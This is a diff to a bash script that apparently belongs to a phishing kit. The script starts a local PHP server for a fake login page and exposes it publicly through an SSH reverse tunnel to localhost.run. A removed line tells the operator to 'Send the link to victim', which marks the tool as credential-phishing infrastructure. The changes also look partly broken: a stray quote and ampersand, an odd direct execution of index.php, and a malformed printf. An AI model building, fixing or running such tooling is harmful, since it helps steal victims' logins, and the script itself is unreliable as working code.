@@ -251,18 +251,16 @@ local_port="${local_port:-${local_def_port}}"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$local_port\e[0m\e[1;92m)\e[0m\n"
 sleep 2
-echo "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$local_port ssh.localhost.run" 2> /dev/null > .www/.locallink ' &
-sleep 5
-
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalhostRun...\e[0m\n"
 fuser -k $local_port/tcp > /dev/null 2>&1
 cd .www/ && php -S localhost:$local_port > /dev/null 2>&1 &
+chmod +x index.php
+PORT=$local_port ./index.php
 sleep 3
-local_link=$(grep -o "https://[0-9a-z]*\.localhost.run" .www/.locallink)
 banner
 printf "\e[0m\n"
-printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $local_link
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m' ssh -R 80:localhost:$local_port ssh.localhost.run
 printf "\n"
 
 }
